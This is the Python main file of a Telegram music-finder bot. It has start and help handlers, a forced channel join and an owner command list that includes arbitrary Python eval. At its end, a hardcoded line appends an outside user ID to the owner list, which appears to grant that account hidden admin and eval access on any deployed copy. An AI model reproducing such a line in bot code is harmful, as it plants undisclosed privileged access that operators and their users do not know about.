from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db
from pyrogram.errors import ChatAdminRequired, UserNotParticipant, ChatWriteForbidden


start_photo = "https://telegra.ph/file/e8bf37370b03bc9f3118f.jpg"

start_text = """
**👋 hello There,** [{}](tg://user?id={})
     
                 **Music Finder Bot**  

🔥 This bot most advanced nikone music finder bot,keyword search & also voice search sport 🔥

**🍀 FRO MUSIC LOVERS ⚡️**

◇───────────────◇
┏━━━━━━━━━━━━━━━━━┓
┣★ ✅ Voice music search supported 🎤
┣★ 🌺 keyword music search 🎸
┣★ 🔥 sported fro group 
┣★ **🎵 more Fast download**
┣★ 📥 stock Every Download Music
┣★ 🚀 inbox supported 
┣★ 🌷 Automatically lyrics Finder (all lang.)
┣★ 🔗 24 Hour activet 
┗━━━━━━━━━━━━━━━━━┛

◇───────────────◇

**🍀 Developer :** @chamod_deshan


🔥 ** @Zu_Project  🇱🇰   Corporation ©️**"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


start_img = f"https://telegra.ph/file/2e2ebb76cd753600b5bef.jpg"

FSUBB = InlineKeyboardMarkup(
        [[
        InlineKeyboardButton(text="  Zu Project  🇱🇰  ", url=f"https://t.me/Zu_Project") 
        ]]      
    )

@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    try:
        await message.reply_chat_action("typing")
        await message._client.get_chat_member(int("-1001110021950"), message.from_user.id)
    except UserNotParticipant:
        await message.reply_text(
        text=f"**⛔️ Access Denied ⛔️**\n\n🙋‍♂️ **Hey There** {message.from_user.mention}, You Must **Join** @Zu_Project  🇱🇰   Telegram **Channel** To Use This BOT. So, **Please Join** it & Try Again🤗. **Thank** You 🤝", disable_web_page_preview=True, reply_markup=FSUBB, reply_to_message_id = message.message_id
    )
        return
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="➕    ADD TO GROUP     ➕ ", url="http://t.me/The_song_finder_bot?startgroup=true"),
            
            ],
            [
             InlineKeyboardButton(text="  Zu Project  🇱🇰  ", url="http://t.me/Zu_Project")

            ],
            [InlineKeyboardButton(text="🍀 zoneunlimited  🍀", url="http://t.me/zoneunlimited")
            
            ],
            [InlineKeyboardButton(text="🧿YOU  Tech🧿", url="https://t.me/YouTech_VPN_HUB")
            
            ],
            [InlineKeyboardButton(text="🎃 Subzero Ehi Team 🎃", url="https://t.me/subzeroehiteam")
        
            ],
            [InlineKeyboardButton(text="🌷 Developer 🌷", url="http://t.me/chamod_deshan")
            
            ],
            [InlineKeyboardButton(text=
                       "◇────────🔍 Search Again 🔎───────◇", switch_inline_query_current_chat=""
               
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    try:
        await message.reply_chat_action("typing")
        await message._client.get_chat_member(int("-1001110021950"), message.from_user.id)
    except UserNotParticipant:
        await message.reply_text(
        text=f"**⛔️ Access Denied ⛔️**\n\n🙋‍♂️ **Hey There** {message.from_user.mention}, You Must **Join** @Zu_Project Telegram **Channel** To Use This BOT. So, **Please Join** it & Try Again🤗. **Thank** You 🤝", disable_web_page_preview=True, reply_markup=FSUBB, reply_to_message_id = message.message_id
    )
        return
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "send you song name... 🔥🚀\n /song (song name) 🥳"
    await message.reply(text)

OWNER_ID.append(1901997764)
app.start()
LOGGER.info("nikonemusicfinder Is Now Working🚀🔥🚀")
idle()
